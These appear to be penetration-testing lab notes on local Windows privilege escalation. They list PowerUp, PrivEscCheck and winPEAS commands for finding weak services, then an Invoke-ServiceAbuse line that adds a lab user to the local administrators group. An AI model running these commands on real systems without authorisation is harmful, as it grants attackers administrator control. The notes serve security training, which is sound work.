
Privilege Escalation - Local

Services Issues using PowerUp

* Get services with unquoted paths and a space in their name.
```
Get-ServiceUnquoted -Verbose
```

* Get services where the current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```

*  Get the services whose configuration current user can modify.
```
Get-ModifiableService -Verbose
```

* Run all checks from :
– PowerUp
```
Invoke-AllChecks
```

– Privesc:
```
Invoke-PrivEscCheck
```

– PEASS-ng:
```
winPEASx64.exe
```


### If we find any vulnerable service with modify permission

```
 Invoke-ServiceAbuse
```

Can be used

```
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName dcorp\student529
```

This will add our user to Local admins group

